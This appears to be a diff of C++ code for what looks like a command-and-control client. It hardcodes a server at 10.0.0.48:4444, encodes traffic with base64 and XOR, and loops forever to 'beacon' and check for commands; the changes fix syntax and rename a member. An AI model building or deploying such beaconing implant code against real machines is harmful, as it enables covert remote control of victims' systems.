@@ -39,15 +39,15 @@ Client::Client() :
 		"10.0.0.48",
 		"4444",
 		TransportLayerType::TCP,
-		SerializerType::BINARY
+		SerializerType::BINARY,
 		EncoderType::BASE64,
 		EncryptorType::XOR
+		)
 	)
-)
 {
 	//messageHandler_.setTransportLayer(*transportLayer_);
 }
-
+/*
 Client::Client() :
 	messageHandler_(),
 	transportLayerPtr_(
@@ -56,12 +56,12 @@ Client::Client() :
 		server,
 		port,
 		transportLayerType::TCP,
-		serializerType::BINARY
+		serializerType::BINARY,
 		encoderType::BASE64,
 		encryptorType::XOR
+		)
 	)
-)
-{}
+{}*/
 
 // Constructor with specific transport type
 /*
@@ -103,11 +103,11 @@ bool Client::run()
 
 	while (true)
 	{
-		if (!transportLayer_->isConnected())
+		if (!transportLayerPtr_->isConnected())
 		{
-			transportLayer_->connect();    // Try to connect (handles if already connected)
+			transportLayerPtr_->connect();    // Try to connect (handles if already connected)
 		}
-		transportLayer_->beacon();     // Send heartbeat + check commands... also receive() is called inside beacon
+		transportLayerPtr_->beacon();     // Send heartbeat + check commands... also receive() is called inside beacon
 		//transporter_.receive();
 		//transporter_.sendMessage();
 		Sleep(5000);            // Wait 1 minute
